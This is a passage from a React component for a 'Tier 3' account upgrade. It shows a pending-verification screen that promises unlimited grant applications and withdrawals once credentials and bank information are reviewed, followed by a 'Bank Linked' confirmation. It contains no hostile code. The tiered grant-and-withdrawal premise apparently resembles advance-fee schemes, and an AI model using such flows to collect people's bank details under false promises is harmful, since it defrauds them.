                <p className="text-foreground text-center leading-relaxed">Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. Our review team is currently processing your request with careful attention to security and compliance. This process typically takes 24 hours, though it may require additional time depending on verification requirements. You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate access to unlimited grant applications and withdrawal capabilities. We appreciate your patience and recommend checking your email regularly for updates.</p>
              </div>
              <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
                <p className="font-semibold text-foreground mb-3">📋 What Happens Next?</p>
                <ol className="space-y-3 text-sm text-muted-foreground">
                  {["Our review team verifies your credentials and bank information", "We conduct security and compliance checks (24 hours typical)", "You'll receive an email confirmation once approved", "Full Tier 3 access activated immediately upon approval"].map((item, i) => (
                    <li key={i} className="flex items-start gap-3">
                      <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">{i + 1}</span>
                      <span>{item}</span>
                    </li>
                  ))}
                </ol>
              </div>
              <button onClick={() => navigate({ to: "/dashboard" })} className="w-full py-4 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2">
                <ArrowLeft className="h-4 w-4" /> Return to Dashboard
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (step === "success") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6"><Logo /></header>
        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-forest px-8 py-12 text-forest-foreground text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 mb-6 animate-bounce"><CheckCircle2 className="h-8 w-8 text-gold" /></div>
              <h2 className="font-display text-2xl font-semibold">Bank Linked!</h2>
              <p className="mt-2 text-white/80">Your account has been securely connected</p>
            </div>
            <div className="p-8 space-y-6">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">Linked Account</p>
                <p className="text-lg font-semibold text-foreground">{selectedBank?.name}</p>
              </div>
              <button onClick={() => navigate({ to: "/dashboard" })} className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2">
                <ArrowLeft className="h-4 w-4" /> Back to Dashboard
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return null;
}

export default UpgradeTier3;
